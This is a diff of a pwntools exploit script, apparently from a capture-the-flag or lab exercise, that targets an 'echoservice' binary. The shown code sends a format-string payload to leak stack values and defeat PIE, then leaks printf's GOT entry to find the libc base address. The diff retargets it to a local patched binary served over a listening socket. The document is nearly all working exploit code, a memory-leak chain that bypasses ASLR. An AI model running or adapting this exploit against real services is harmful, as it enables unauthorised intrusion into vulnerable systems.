@@ -1,23 +1,28 @@
-#!#!/usr/bin/env python3
+#!/usr/bin/env python3
 from pwn import *
 
 # Read binaries
-elf = context.binary = ELF("/usr/bin/echoservice")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+elf = context.binary = ELF("./echoservice_patched")
+libc = ELF("./libc-2.28.so")
 
+PORT = 4444
 
 # For GDB debugging
 def start():
-    if args.GDB:
-        return gdb.debug(elf.path, gdbscript='continue')
-    else:
+    if args.LOCAL:
+        if args.GDB:
+            return gdb.debug(elf.path, gdbscript='continue')
         return process(elf.path)
+    else:
+        l = listen(PORT)
+        _ = l.wait_for_connection()
+        return l
 
 
 p = start()
 
 # Calculate offset from 21th value in stack to pie base without aslr
-offset = 0x555555555275 - 0x555555554000
+offset = 0x5555555552bd - 0x555555554000
 
 payload = b"%27$p"
 p.sendline(payload)
@@ -36,7 +41,7 @@ payload += p64(printf_got)
 p.sendline(payload)
 PRINTF = unpack(p.recvuntil(b"|END", drop=True), 'all')
 
-log.success(f"PRINTF: {hex(PRINTF)}")
+log.success(f"PRINTF@LIBC: {hex(PRINTF)}")
 
 # Get libc base
 libc.address = PRINTF - libc.sym['printf']
